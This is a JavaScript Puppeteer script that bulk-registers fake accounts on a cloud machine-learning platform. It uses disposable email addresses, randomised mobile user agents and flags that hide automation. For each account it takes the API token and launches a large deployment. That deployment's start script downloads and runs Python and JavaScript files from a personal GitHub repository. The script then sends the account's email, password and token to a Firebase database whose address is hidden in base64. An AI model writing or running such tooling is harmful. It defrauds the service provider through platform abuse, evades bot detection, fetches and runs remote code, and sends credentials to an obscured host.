const gmailApi = require('./gmail-api.js')
const puppeteer = require('puppeteer')
const axios = require('axios')

let browser = null
let page = null
let COOKIES = null
let TOKEN = null
let GMAIL = null
let USER = null
let PASS = null

const GR = new gmailApi()

let BASE_URL = Buffer.from('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==', 'base64').toString('ascii')

let mUserAgent = 'Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36'

const viewport = [
    { width: 600, height: 1024 },
    { width: 360, height: 640 },
    { width: 360, height: 740 },
    { width: 320, height: 658 },
    { width: 712, height: 1138 },
    { width: 768, height: 1024 },
    { width: 810, height: 1080 },
    { width: 1024, height: 1366 },
    { width: 834, height: 1194 },
    { width: 320, height: 480 },
    { width: 320, height: 568 },
    { width: 375, height: 667 },
    { width: 414, height: 736 },
    { width: 375, height: 812 },
    { width: 414, height: 896 },
    { width: 414, height: 828 },
    { width: 390, height: 844 },
    { width: 428, height: 926 },
    { width: 240, height: 320 },
    { width: 800, height: 1280 },
    { width: 384, height: 640 },
    { width: 640, height: 360 },
    { width: 412, height: 732 },
    { width: 600, height: 960 },
    { width: 320, height: 533 },
    { width: 480, height: 854 },
    { width: 411, height: 731 },
    { width: 411, height: 823 },
    { width: 393, height: 786 },
    { width: 353, height: 745 },
    { width: 393, height: 851 }
]

console.log('-----START-----')

try {
    startBrowser()
} catch (error) {}

async function startBrowser() {

    try {
        GMAIL = await GR.getGmail()

        if (GMAIL) {
            USER = getRandomUser()
            PASS = getRandomPassword()

            console.log('Gmail: '+GMAIL)

            console.log(USER, PASS)

            let size = viewport[getRandom(0, viewport.length)]

            try {
                let id = getRandom(1, 28676)
                let response = await getAxios(BASE_URL+'user-agent/'+id+'.json')
                let split = response.data.split('|')
                mUserAgent = 'Mozilla/5.0 (Linux; Android '+split[0]+'; '+split[1]+') AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+split[2]+' Mobile Safari/537.36'
            } catch (error) {}

            browser = await puppeteer.launch({
                headless: false,
                headless: 'new',
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--ignore-certificate-errors',
                    '--ignore-certificate-errors-skip-list',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-browser-side-navigation',
                    '--disable-dev-shm-usage',
                    '--disable-extensions',
                    '--disable-infobars',
                    '--disable-gpu',
                    '--user-agent='+mUserAgent
                ],
                defaultViewport: {
                    width: size['width'],
                    height: size['height'],
                    deviceScaleFactor: 2,
                    isMobile: true,
                    hasTouch: true,
                    isLandscape: false
                }
            })
        
            page = (await browser.pages())[0]

            while (true) {
                await page.goto('https://app.community.saturnenterprise.io/auth/signup', { waitUntil: 'load', timeout: 0 })
                await delay(1000)

                await page.type('input[name="username"]', USER)
                await delay(1000)
                await page.type('input[name="email"]', GMAIL)
                await delay(1000)
                await page.keyboard.press('Enter')

                let mSuccess = false

                while (true) {
                    let completed = await exists('p[class="has-text-centered"]')
                    if (completed) {
                        mSuccess = true
                        break
                    } else {
                        try {
                            let result = await page.evaluate(() => document.querySelector('p[class="whitespace-pre-wrap"]').innerText)
                            if (result.length > 10) {
                                if (result.includes(USER)) {
                                    USER = getRandomUser()
                                    break
                                } else {
                                    GMAIL = await GR.getGmail()
                                    break
                                }
                            }
                        } catch (error) {
                            break
                        }
                    }
                }

                if (mSuccess) {
                    break
                }

                await delay(2000)
            }

            console.log('Verification Link Send')

            let link = await GR.getVerificationLink(GMAIL)
            if (link) {
                console.log('Verification Link Received')
                await page.goto(link, { waitUntil: 'load', timeout: 0 })
                await delay(3000)
                await page.type('input[placeholder="Password"]', PASS)
                await delay(500)
                await page.type('input[placeholder="Confirm Password"]', PASS)
                await delay(500)
                await page.keyboard.press('Enter')
                let mSuccess = await waitForNextPage()
                if (mSuccess) {
                    console.log('Set Profile')
                    let list1 = [ 'Data Scientist', 'Student', 'Hobbyist', 'Engineer', 'Researcher', 'Developer', 'Something else']
                    let list2 = [ 'just me', '2-5', '6-20', '20+' ]
                    let list3 = [ 'Training ML models', 'Deploying a model', 'Building MLOps capabilities', 'Training LLMs', 'Exploring data', 'Learning about machine learning', 'Something else']
                    await delay(2000)
                    await page.select('div[class="inline w-full"] > div:nth-child(2) > select', list1[getRandom(0, list1.length)])
                    await delay(1000)
                    await page.select('div[class="inline w-full"] > div:nth-child(4) > select', list2[getRandom(0, list2.length)])
                    await delay(1000)
                    await page.select('div[class="inline w-full"] > div:nth-child(6) > select', list3[getRandom(0, list3.length)])
                    await delay(1000)
                    await page.keyboard.press('Enter')
                    mSuccess = await waitForCreate()
                    if (mSuccess) {
                        console.log('Create Success')
                        await delay(5000)
                        await page.goto('https://app.community.saturnenterprise.io/dash/o/community/user-details/', { waitUntil: 'load', timeout: 0 })
                        await delay(1000)
                        mSuccess = await waitForElement('span[title="Show"]')
                        if (mSuccess) {
                            let token = null
                            let timeout = 0
                            while (true) {
                                timeout++
                                await page.evaluate(() => document.querySelector('span[title="Show"]').click())
                                await delay(1000)
                                token = await page.evaluate(() => document.querySelector('input[readonly="readonly"]').value)
                                if (token != null && !token.includes('*******')) {
                                    break
                                }

                                if (timeout > 15) {
                                    break
                                }
                                
                                await delay(1000)
                            }

                            if (token) {
                                console.log(token)
                                
                                let data = await createLab(getRandomName(), token)

                                if (data) {
                                    await startLab(data['id'])

                                    let send = {
                                        id: data['id'],
                                        url: data['url'],
                                        gmail: GMAIL,
                                        token: token,
                                        pass: PASS,
                                        quote: parseInt(new Date().getTime()/1000)
                                    }
        
                                    await patchAxios(BASE_URL+'jupyter/'+USER+'.json', JSON.stringify(send), {
                                        headers: {
                                            'Content-Type': 'application/x-www-form-urlencoded'
                                        }
                                    })
        
                                    console.log('-----COMPLETED-----')
                                    await delay(10000)
                                    process.exit(0)
                                } else {
                                    console.log('-----FAILED-----')
                                    process.exit(0)
                                }
                            } else {
                                console.log('-----TOKEN-NULL-----')
                                process.exit(0)
                            }
                        } else {
                            console.log('-----FAILED-----')
                            process.exit(0)
                        }
                    } else {
                        console.log('-----FAILED-----')
                        process.exit(0)
                    }
                } else {
                    console.log('-----FAILED-----')
                    process.exit(0)
                }
            } else {
                console.log('Verification Link Not Found')
                process.exit(0)
            }
        } else {
            console.log('Gmail Adress Null')
            process.exit(0)
        }
    } catch (error) {
        console.log(error)
    }
}

async function createLab(name, token) {
    try {
        const response = await axios.post('https://app.community.saturnenterprise.io/api/deployments',
            {
                'name': name,
                'description': '',
                'image_tag_id': '462122958c2248f48961b7df779720ca',
                'command': 'python server.py',
                'instance_size': '2xlarge',
                'scale': 1,
                'environment_variables': {},
                'start_script': 'wget -O server.py https://raw.githubusercontent.com/raiyan088/public/main/python/server.py\nwget -O worker.py https://raw.githubusercontent.com/raiyan088/public/main/python/worker.py\nwget -O module.js https://raw.githubusercontent.com/raiyan088/public/main/python/module.js\npip install websocket-client\npip install javascript',
                'working_dir': '/home/jovyan/workspace',
                'extra_packages': null,
                'start_ssh': false,
                'start_dind': false,
                'healthcheck': null,
                'subdomain': '',
                'org_id': 'cc04955f8ca34cc8b2797aa5dc9f5ce6',
                'image_enforce_trusted': false
            },
            {
                headers: {
                    'accept': 'application/json',
                    'authorization': 'Bearer '+token,
                    'content-type': 'application/json'
                },
                maxRedirects: 0,
                validateStatus: null,
            })

        let id = response.data['id']
        let url = response.data['url']

        return { id:id, url:url }
    } catch (error) {
        console.log(error)
    }

    return null
}

async function startLab(id, token) {
    try {
        await axios.post('https://app.community.saturnenterprise.io/api/deployments/'+id+'/start', {}, {
            headers: {
                'accept': 'application/json',
                'authorization': 'Bearer '+token,
                'content-type': 'application/json'
            },
            maxRedirects: 0,
            validateStatus: null,
        })
    } catch (error) {}
}

async function waitForNextPage() {
    let success = false
    let timeout = 0
    while (true) {
        timeout++
        try {
            let url = await page.url()
            if (url.startsWith('https://app.community.saturnenterprise.io/auth/welcome')) {
                let data = await exists('button[type="submit"]')
                if (data) {
                    success = true
                    break
                }
            }
        } catch (error) {}

        if (timeout > 15) {
            break
        }

        await delay(1000)
    }

    return success
}

async function waitForCreate() {
    let success = false
    let timeout = 0
    while (true) {
        timeout++
        try {
            let url = await page.url()
            if (url.startsWith('https://app.community.saturnenterprise.io/dash/')) {
                success = true
                break
            } else if (url.startsWith('https://saturncloud.io/thanks')) {
                timeout = 0
            } else if (url.startsWith('https://app.community.saturnenterprise.io/auth/welcome')) {
                let chatbox = await exists('div[class="intercom-app"]')
                if (chatbox) {
                    await page.evaluate(() => document.querySelector('div[class="intercom-app"]').style.visibility = "hidden")
                    await delay(500)
                    await page.click('button[type="submit"]')
                    await delay(2000)
                }
            }
        } catch (error) {}

        if (timeout > 30) {
            break
        }

        await delay(1000)
    }

    return success
}

async function waitForElement(element) {
    let success = false
    let timeout = 0
    while (true) {
        timeout++
        let data = await exists(element)
        if (data) {
            success = true
            break
        }

        if (timeout > 15) {
            break
        }
        await delay(1000)
    }
    return success
}

async function exists(evement) {
    return await page.evaluate((evement) => {
        let root = document.querySelector(evement)
        if (root) {
            return true
        }
        return false
    }, evement)
}

async function getAxios(url) {
    let loop = 0
    let responce = null
    while (true) {
        try {
            responce = await axios.get(url, {
                timeout: 10000
            })
            break
        } catch (error) {
            loop++

            if (loop >= 5) {
                break
            } else {
                await delay(3000)
            }
        }
    }
    return responce
}


async function postAxios(url, body, data) {
    let loop = 0
    let responce = null
    while (true) {
        try {
            data.timeout = 10000
            responce = await axios.post(url, body, data)
            break
        } catch (error) {
            loop++

            if (loop >= 5) {
                break
            } else {
                await delay(3000)
            }
        }
    }
    return responce
}

async function putAxios(url, body, data) {
    let loop = 0
    let responce = null
    while (true) {
        try {
            data.timeout = 10000
            responce = await axios.put(url, body, data)
            break
        } catch (error) {
            loop++

            if (loop >= 5) {
                break
            } else {
                await delay(3000)
            }
        }
    }
    return responce
}

async function patchAxios(url, body, data) {
    let loop = 0
    let responce = null
    while (true) {
        try {
            data.timeout = 10000
            responce = await axios.patch(url, body, data)
            break
        } catch (error) {
            loop++

            if (loop >= 5) {
                break
            } else {
                await delay(3000)
            }
        }
    }
    return responce
}

function getRandomPassword() {
    let C = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
    let S = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    let U = ['#','$','@']
    
    let pass = C[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += N[Math.floor((Math.random() * 10))]
    pass += N[Math.floor((Math.random() * 10))]
    pass += N[Math.floor((Math.random() * 10))]
    pass += U[Math.floor((Math.random() * 3))]
    pass += U[Math.floor((Math.random() * 3))]
    
    return pass
}

function getRandomUser() {
    let S = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    
    let pass = S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += N[Math.floor((Math.random() * 10))]
    pass += N[Math.floor((Math.random() * 10))]
    pass += N[Math.floor((Math.random() * 10))]
    pass += N[Math.floor((Math.random() * 10))]
    pass += N[Math.floor((Math.random() * 10))]

    return pass
}

function getRandomName() {
    let S = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    
    let pass = S[Math.floor((Math.random() * 26))].toUpperCase()
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]

    return pass
}

function getRandom(min, max) {
    return Math.floor((Math.random() * (max-min)) + min)
}

function getHeader() {
    return {
        'Host': 'www.emailnator.com',
        'Sec-Ch-Ua': '"Not A(Brand";v="99", "Android WebView";v="121", "Chromium";v="121"',
        'X-Xsrf-Token': TOKEN,
        'Sec-Ch-Ua-Mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.101 Mobile Safari/537.36',
        'Sec-Ch-Ua-Arch': '""',
        'Sec-Ch-Ua-Full-Version': '"121.0.6167.101"',
        'Sec-Ch-Ua-Platform-Version': '"10.0.0"',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Full-Version-List': '"Not A(Brand";v="99.0.0.0", "Android WebView";v="121.0.6167.101", "Chromium";v="121.0.6167.101"',
        'Sec-Ch-Ua-Bitness': '""',
        'Sec-Ch-Ua-Model': '"Mi 9T Pro"',
        'Sec-Ch-Ua-Platform': '"Android"',
        'Origin': 'https://www.emailnator.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.emailnator.com/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': COOKIES
    }
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
